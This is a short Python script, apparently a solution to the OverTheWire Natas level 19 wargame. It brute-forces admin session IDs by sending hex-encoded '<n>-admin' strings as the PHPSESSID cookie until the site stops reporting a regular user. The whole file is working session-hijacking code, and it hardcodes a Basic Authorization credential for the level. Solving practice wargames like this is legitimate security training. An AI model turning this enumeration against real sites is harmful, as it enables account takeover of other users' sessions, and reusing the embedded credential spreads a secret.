import requests
#the headers can be seen after submitting on the website. thats where the auth stuff are from

for i in range(641):
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    payload = {"username": "admin", "password": "help"}
    # Easiest method ive found on turning strings to hex values. the string needs to be encoded to bytestring or something before you can use the hex() 
    customHexID = '{}-admin'.format(i).encode('utf-8').hex()

    headers = {"Cookie": "PHPSESSID={0}".format(customHexID), "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}
    r = requests.get(url, params=payload, headers=headers)

    if (not("You are logged in as a regular user." in r.text)):
        print(r.text)
        exit()
    else:
        print("Failed ",i)
